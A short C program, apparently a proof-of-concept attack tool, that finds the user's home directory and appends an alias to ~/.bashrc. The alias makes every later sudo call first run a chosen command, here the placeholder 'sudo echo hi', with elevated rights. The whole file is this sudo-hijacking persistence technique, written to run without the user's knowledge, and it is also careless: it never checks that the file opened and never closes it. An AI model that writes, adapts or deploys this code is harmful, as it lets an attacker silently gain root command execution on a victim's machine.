#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define MAX_PATH 255
#define COMMAND_TO_GET_HOME "echo $HOME"
#define SUDO_COMMAND "sudo echo hi"
#define DEBUG TRUE

int main(){
	FILE *command = popen(COMMAND_TO_GET_HOME,"r"); //Get $HOME
	char path[MAX_PATH];

	//If we could not run a command
	if(command == NULL){
		#ifdef DEBUG
		printf("%s did not work\n",COMMAND_TO_GET_HOME);
		#endif
		exit(1);
	}

	//Put command into path
	fgets(path,sizeof(path),command);
	char *pos;

	//Get rid of newline
	if ((pos=strchr(path, '\n')) != NULL){
    		*pos = '\0';
	}
	else{
		#ifdef DEBUG
		printf("Could not find newline\n");
		#endif
		exit(1);
	}

	//Add /.bashrc to path
	strcat(path,"/.bashrc");

	#ifdef DEBUG
	printf("%s\n",path);
	#endif

	//Open /.bashrc
	FILE *writer = fopen(path,"a");

	//Creates alias to run SUDO_COMMAND then sudo
	fputs("alias sudo=\'",writer);
	fputs(SUDO_COMMAND,writer);
	fputs("; sudo\'\n",writer);
}
